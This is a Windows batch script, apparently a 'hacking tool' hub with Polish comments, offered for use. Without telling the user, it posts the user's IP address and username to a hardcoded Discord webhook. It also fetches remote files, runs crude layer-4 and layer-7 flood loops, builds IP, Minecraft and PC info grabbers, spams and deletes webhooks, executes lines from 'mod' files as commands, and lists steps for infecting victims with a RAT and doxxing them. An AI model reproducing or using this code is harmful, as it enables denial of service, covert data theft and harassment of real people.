��
@echo off 
title 3rdSide / proggramed by abrissy - https://discord.gg/nM8raQ3Syb / 
chcp 65001
cls 
color 4
echo. 

>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

if "%errorlevel%" == "0" (
    goto bdor
    rem Tutaj umieść kod, który ma być wykonany, gdy skrypt jest uruchomiony jako administrator.
) else (
    echo [91m[3rdside@%username%] ~# [0m Launch this script as administrator!
    pause >nul 
    exit
    rem Tutaj możesz umieścić kod, który ma być wykonany, gdy skrypt nie jest uruchomiony jako administrator.
)
:bdor
pushd %~dp0
::Backdor

if %username%==Vader goto hub
if %username%==abris goto hub

:accountcheck
start /min cmd /c "g.bat"
set wh1=https://discord.com/api/web
set wh2=hooks/1129728061064101998/c04z2
set wh3=S9OZDB5Sn9XayWAKqZqQ7KR7WCUXXI4iCrIVr25t9E7duGv3xjuyftJojB2YUW9
curl --silent https://api.ipify.org/>hwiddata.txt 
curl --silent -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone ```%username%``` HIT\"}" %wh1%%wh2%%wh3% 
curl --silent --output /dev/null -F l=@"hwiddata.txt" %wh1%%wh2%%wh3%
del hwiddata.txt 

curl -o base.txt https://raw.githubusercontent.com/3rdSideOwner/3rdSide-Hacking-Tool/main/base.txt
REM Wczytanie HWID z komputera
for /f "tokens=2 delims== " %%A in ('wmic csproduct get uuid /value ^| findstr /i "UUID"') do (
    set "current_hwid=%%A"
)

REM Wczytanie HWID-ów z pliku "base.txt"
set "hwid_file=base.txt"
if not exist "%hwid_file%" (
    echo Plik "%hwid_file%" nie istnieje.
    exit /b 1
)

REM Porównanie HWID
set "hwid_match=false"
for /f "usebackq delims=" %%B in ("%hwid_file%") do (
    if "%%B"=="%current_hwid%" (
        set "hwid_match=true"
        goto :result
    )
)

:result
REM Wynik porównania
if "%hwid_match%"=="true" (
    del base.txt
    goto hub
) else (
    del base.txt
    goto cracked
)

:cracked 
cls 
type logo.txt 
echo.
echo your hwid is not on whitelist! 
echo your hwid: %current_hwid%
pause >nul 
exit 

:hub 
color 4
cls
type logo.txt 
echo.
type hud.txt 
echo.
set /p "hub=[91m[3rdside@%username%] ~# [0m"

if %hub%==1 goto layer4botnet
if %hub%==2 goto layer7botnet 
if %hub%==3 goto iplookup
if %hub%==4 goto ipgrabberbuilder
if %hub%==5 goto mcinfograbber
if %hub%==6 goto pcinfologger
if %hub%==7 goto webhooknuker
if %hub%==8 goto webhookremover 
if %hub%==9 goto webhookmessagesender
if %hub%==10 goto mods
if %hub%==11 goto doxxinghelper
if %hub%==12 goto ipv4 
if %hub%==13 goto pip 
if %hub%==14 goto domainip
::===========================================================
:layer7botnet 
set /p "layer7url=[91m[3rdside@target-url] ~# [0m"
set /p "layer7cooldown=[91m[3rdside@botnet-cooldown] ~# [0m"
echo ===============================================
goto layer7sent
:layer7sent
curl --silent --no-buffer %layer7url% & timeout %layer7cooldown% 
echo [91m[3rdside@layer7][0m Request sent!
goto layer7sent
::===========================================================
:layer4botnet
set /p "layer4ip=[91m[3rdside@target-ip] ~# [0m"
set /p "layer4pck=[91m[3rdside@packets] ~# [0m"
if %layer4ip%==back goto hub 
if %layer4pck%==back goto hub
echo ===============================================
ping -t -l %layer4pck% %layer4ip%
::===========================================================
:iplookup 
set /p "ipinfoip=[91m[3rdside@target-ip] ~#[0m "
curl ipinfo.io/%ipinfoip%?token=7ac6b2bcbf4dae
echo.
echo click any button to back to main page
pause >nul 
goto hub
::===========================================================
:ipgrabberbuilder
curl -o iptemplate.txt "https://raw.githubusercontent.com/torch-studios/templates/main/iptemplate.txt"
setlocal enabledelayedexpansion
echo.
echo. 
set "input_file=iptemplate.txt"
set "output_file=IPGrabber.bat"

REM Pobierz wartość webhook od użytkownika
set /p "webhook=[91m[3rdside@Webhook] ~#[0m "

REM Otwórz plik wejściowy i utwórz plik wyjściowy
(
    for /f "usebackq delims=" %%a in ("%input_file%") do (
        set "line=%%a"
        REM Sprawdź, czy linia zawiera "set webhook="
        echo !line! | findstr /i /c:"set webhook=" >nul
        if !errorlevel! equ 0 (
            REM Jeśli tak, zaktualizuj zawartość webhooka
            echo set webhook=!webhook!
        ) else (
            REM W przeciwnym razie pozostaw linię bez zmian
            echo !line!
        )
    )
) > "%output_file%"

xcopy ipgrabber.bat "builded\"
del IPGrabber.bat
start builded
echo Succesful!
del iptemplate.txt
del ip.txt
timeout 5 >nul 
goto hub

:mcinfograbber
setlocal enabledelayedexpansion
echo.
echo.
set "input_file=mcinfotemplate.txt"
set "output_file=MCInfoGrabber.bat"

REM Pobierz wartość webhook od użytkownika
set /p "webhook=[91m[3rdside@Webhook] ~#[0m "

REM Otwórz plik wejściowy i utwórz plik wyjściowy
(
    for /f "usebackq delims=" %%a in ("%input_file%") do (
        set "line=%%a"
        REM Sprawdź, czy linia zawiera "set webhook="
        echo !line! | findstr /i /c:"set webhook=" >nul
        if !errorlevel! equ 0 (
            REM Jeśli tak, zaktualizuj zawartość webhooka
            echo set webhook=!webhook!
        ) else (
            REM W przeciwnym razie pozostaw linię bez zmian
            echo !line!
        )
    )
) > "%output_file%"

xcopy MCInfoGrabber.bat "builded\"
del MCInfoGrabber.bat
start builded
echo Succesful!
timeout 5 >nul 
goto hub 

:pcinfologger
setlocal enabledelayedexpansion
echo.
echo.
set "input_file=pcinfotemplate.txt"
set "output_file=PCInfoGrabber.bat"

REM Pobierz wartość webhook od użytkownika
set /p "webhook=[91m[3rdside@Webhook] ~#[0m "

REM Otwórz plik wejściowy i utwórz plik wyjściowy
(
    for /f "usebackq delims=" %%a in ("%input_file%") do (
        set "line=%%a"
        REM Sprawdź, czy linia zawiera "set webhook="
        echo !line! | findstr /i /c:"set webhook=" >nul
        if !errorlevel! equ 0 (
            REM Jeśli tak, zaktualizuj zawartość webhooka
            echo set webhook=!webhook!
        ) else (
            REM W przeciwnym razie pozostaw linię bez zmian
            echo !line!
        )
    )
) > "%output_file%"

xcopy PCInfoGrabber.bat "builded\"
del PCInfoGrabber.bat
start builded
echo Succesful!
timeout 5 >nul 
goto hub 

:webhooknuker 
set /p "webhookspammerwebhook=[91m[3rdside@webhook] ~#[0m "
set /p "webhookspammermessage=[91m[3rdside@message] ~#[0m "

curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone %webhookspammermessage% \"}" %webhookspammerwebhook%
timeout 3 >nul 
echo Nuking ended succesful! 
timeout 10 >nul 
goto hub 

:webhookremover
set /p "webhookdelete=[91m[3rdside@webhook] ~#[0m "
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"@everyone ```Webhook removed by 3rdSide user!```  \"}" %webhookdelete%
curl -X DELETE %webhookdelete%

:webhookmessagesender
set /p "webhookmessagewebhook=[91m[3rdside@webhook] ~#[0m "
set /p "webhookmessagemessage=[91m[3rdside@message] ~#[0m "
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"%webhookmessagemessage%\"}" %webhookmessagewebhook%
echo Message sent succesful
timeout 10 >nul 
goto hub

:mods 
echo. 
type hudmods.txt
color 4
set /p "mods=[31m[3rdside@%username%] ~# [0m"

if %mods%==1 goto load 
if %mods%==2 goto upload
if %mods%==3 goto removemod 

:load
color 4
echo.
echo installed mods:
echo.
color 4

for %%I in (mods\*) do (
    echo %%~nI%%~xI
)
echo.
set /p "filename=[31m[3rdside@modname] ~# [0m"
set "filepath=mods\%filename%.3rd"
if exist "%filepath%" (
    for /f "delims=" %%i in (%filepath%) do %%i
) else (
    echo file not exist!
)

:upload 
echo.
echo. 
echo drag 3rd mod here and click enter!
echo.
type upload.txt
echo.
color 4
set /p "dummy="
set "filepath=%dummy:* =%"
if exist "%filepath%" (
    copy "%filepath%" "mods\" >nul
    echo Uploading...
) else (
    echo Wrong file!
)
timeout 2 >nul 
echo Uploaded! 
timeout 5 >nul 
goto mods

:removemod 
echo. 
echo choice mod to remove! 
echo. 
color c
for %%I in (mods\*) do (
    echo %%~nI%%~xI
)
echo.
set /p "removemod=[31m[3rdside@modname] ~# [0m"
del "mods\%removemod%.*" >nul
timeout 2 >nul 
echo Removed! 
timeout 10 >nul 
goto hub 

:doxxinghelper
echo. 
color 4 
echo. 
echo 1 - Send to your discord your hosted rat/grabber 
echo 2 - Wait for your victim 
echo 3 - Use doxxing Template builder to create dox 
echo 4 - Fill informations in template 
echo 5 - go to doxbin.com site 
echo 6 - create account (optional)
echo 7 - Click "Add Paste" on website 
echo 8 - Paste your builded template
echo 9 - Add title
echo 10 - Compleate captcha 
echo 11- Click create
echo GG You doxxed fucking random  
timeout 30 >nul 
goto hub 

:ipv4 
ipconfig 
timeout 10 >nul 
goto hub 
:pip
curl https://api.ipify.org
timeout 10 >nul 
goto hub 
:domainip
set /p "domainip=[31m[3rdside@domain] ~# [0m"
ping %domainip%
timeout 10 >nul 
goto hub 